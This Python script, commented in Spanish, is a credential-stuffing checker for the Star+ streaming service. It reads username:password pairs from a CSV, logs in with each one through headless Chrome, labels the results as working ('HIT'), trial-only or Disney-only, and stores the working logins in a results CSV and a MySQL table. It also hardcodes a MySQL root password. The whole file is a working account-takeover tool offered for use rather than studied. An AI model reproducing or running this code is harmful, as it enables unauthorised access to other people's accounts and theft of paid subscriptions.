import os.path
import csv
import locale
import time
import mysql.connector
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from tqdm import tqdm
from datetime import datetime
from colorama import Fore


# Función para iniciar sesión
def iniciar_sesion(usuario, contrasena, credenciales_validas):
    driver = None

    try:

        # Inicializar el navegador Chrome en modo headless
        chrome_options = Options()
        chrome_options.add_argument('--headless')  # Habilita el modo headless
        chrome_options.add_argument("--disable-logging")  # Desactivar los logs de DevTools
        driver = webdriver.Chrome(options=chrome_options)


        # Acceder a la página de inicio de sesión de Star+
        driver.get('https://www.starplus.com/es-419/login')

        # Esperar hasta que aparezca el campo de usuario
        username_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'email'))
        )
        username_field.send_keys(usuario)

        # Hacer clic en 'Siguiente'
        submit_next = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div/div[4]/div/main/div/form/div[2]/button'))
        )
        submit_next.click()

        # Esperar hasta que aparezca el campo de contraseña
        password_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'password'))
        )
        password_field.send_keys(contrasena)

        # Hacer clic en 'Iniciar Sesión'
        submit_login = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//*[@id="password-continue-login"]'))
            
        )
        submit_login.click()

        time.sleep(8)

        # Verificar si se redirige a la página de prueba
        error_message = "Ocurrió un error al iniciar sesión."
        invalid_urls = [
            'https://www.starplus.com/es-419/combo/redirect',
            'https://www.starplus.com/combo/redirect'
        ]
        if driver.current_url == 'https://www.starplus.com/es-419/restart-subscription'or driver.current_url == 'https://www.starplus.com/es-419/complete-purchase':
             print(
                f"[{Fore.YELLOW}-{Fore.RESET}] {Fore.YELLOW}TRIAL{Fore.RESET} | Las credenciales {Fore.YELLOW}{usuario}:{contrasena}{Fore.RESET}  son de prueba o no ha renovado suscripción"
            )
        
        elif driver.current_url in invalid_urls:
            print(
                f"[{Fore.YELLOW}-{Fore.RESET}] {Fore.YELLOW}DISNEY{Fore.RESET} | Las credenciales {Fore.YELLOW}{usuario}:{contrasena}{Fore.RESET}  solo tienen membresia a Disney+"
            )

        elif error_message in driver.page_source:
            print(
                f"[{Fore.RED}!{Fore.RESET}] {Fore.RED}BAD{Fore.RESET} | Las credenciales {Fore.RED}{usuario}:{contrasena}{Fore.RESET}   no funcionan... Intentando con el siguiente conjunto"
            )
            
        else:
            print(
                f"[{Fore.GREEN}+{Fore.RESET}] {Fore.GREEN}HIT{Fore.RESET} | Las credenciales {Fore.GREEN}{usuario}:{contrasena}{Fore.RESET} funcionan correctamente"
            )
            credenciales_validas.append((usuario, contrasena))

    except NoSuchElementException:
        print(
                f"[{Fore.RED}!{Fore.RESET}] {Fore.RED}BAD{Fore.RESET} | Las credenciales {Fore.RED}{usuario}:{contrasena}{Fore.RESET}   no funcionan... Intentando con el siguiente conjunto"
            )
    except WebDriverException as e:
        print(
                f"[{Fore.RED}!{Fore.RESET}] {Fore.RED}ERROR{Fore.RESET} | Hubo un problema al intentar iniciar sesión con {Fore.RED}{usuario}:{contrasena}{Fore.RESET}"
            )
    except Exception as e:
        print("")
    finally:
        # Cerrar el navegador en cualquier caso
        if driver:
            driver.quit()


# Función para guardar en la base de datos
def guardar_en_base_de_datos(usuario, contrasena):
    try:
        # Configurar la conexión a la base de datos
        conexion = mysql.connector.connect(
            host="127.0.0.1",
            user="root",
            password="cazarezf97",
            database="accounts"
        )

        # Crear un cursor para ejecutar consultas SQL
        cursor = conexion.cursor()

        # Consulta SQL para verificar si ya existen las credenciales
        consulta_select = "SELECT * FROM starplus WHERE username = %s AND password = %s"
        datos_select = (usuario, contrasena)

        # Ejecutar la consulta SELECT
        cursor.execute(consulta_select, datos_select)

        # Obtener los resultados
        resultados = cursor.fetchall()

        # Verificar si ya existen registros con las mismas credenciales
        if resultados:
            print(f"[{Fore.YELLOW}⚠{Fore.RESET}] | Las credenciales {Fore.YELLOW}{usuario}:{contrasena}{Fore.RESET} ya existen en la base de datos. No se realizará la inserción.")
        else:
            # Consulta SQL para insertar las credenciales en la tabla
            consulta_insert = "INSERT INTO starplus (idAccount, username, password, dateAdded) VALUES (NULL, %s, %s, %s)"
            datos_insert = (usuario, contrasena,datetime.now())

            # Ejecutar la consulta INSERT
            cursor.execute(consulta_insert, datos_insert)

            # Confirmar la transacción
            conexion.commit()

            print(f"[{Fore.GREEN}✓{Fore.RESET}] | Las credenciales {Fore.GREEN}{usuario}:{contrasena}{Fore.RESET} han sido guradadas en la base de datos")

    except mysql.connector.Error as error:
        print(f"[{Fore.RED}X{Fore.RESET}] Error al guardar en la base de datos: {error}")

    finally:
        # Cerrar el cursor y la conexión
        if 'cursor' in locals():
            cursor.close()
        if 'conexion' in locals():
            conexion.close()

# Ruta al archivo CSV con las credenciales
csv_file_path = 'csv/data_starplus.csv'
credenciales_validas = []

# Verificar si el archivo CSV existe
if os.path.isfile(csv_file_path):
    # Obtener el número total de líneas en el archivo CSV
    total_lines = sum(1 for line in open(csv_file_path))

    # Abrir el archivo CSV con tqdm
    with open(csv_file_path, 'r') as csv_file:
        csv_reader = csv.reader(csv_file)

        # Iterar sobre cada línea del archivo CSV con tqdm
        for line in tqdm(csv_reader, total=total_lines, desc="Procesando credenciales", unit=" línea"):
            usuario = line[0]
            contrasena = line[1]

            # Intentar iniciar sesión con las credenciales actuales
            iniciar_sesion(usuario, contrasena, credenciales_validas)


# Guardar las credenciales válidas en un archivo .csv
if credenciales_validas:
    locale.setlocale(locale.LC_TIME, 'es_ES.UTF-8')
    now = datetime.now()
    format_date = now.strftime('%d-%b-%Y_%I-%M-%S')  # Formato de fecha en el nombre del archivo

    # Cabeceras
    headers = ['Username', 'Password']

    # Guardar las credenciales válidas en un archivo .csv
    file_path = f'results/credenciales_validas_starplus_{format_date}.csv'
    with open(file_path, 'w', newline='') as csv_file:
        # Escribir cabeceras y luego credenciales
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(headers)

        for credencial in credenciales_validas:
            csv_writer.writerow(credencial)

    print(f"[{Fore.GREEN}✓{Fore.RESET}] | Credenciales válidas guardadas en {file_path}")

    # Verificar si hay credenciales antes de intentar guardar en la base de datos
    if credenciales_validas:
        # Preguntar al usuario si desea guardar en la base de datos MySQL
        respuesta = input("¿Deseas guardar las credenciales válidas en la base de datos MySQL? (y/n): ").lower()
        if respuesta == 'y':
            for credencial in credenciales_validas:
                guardar_en_base_de_datos(*credencial)
            print(f"[{Fore.GREEN}✓{Fore.RESET}] | Credenciales válidas guardadas en la base de datos MySQL.")
        else:
             print(f"{Fore.RED}No{Fore.RESET} hay credenciales para guardar en la base de datos MySQL.")
    else:
        print(f"[{Fore.RED}X{Fore.RESET}] | No hay credenciales para guardar en la base de datos MySQL.")

else:
    print(f"[{Fore.RED}X{Fore.RESET}] | No hay credenciales válidas para guardar.")
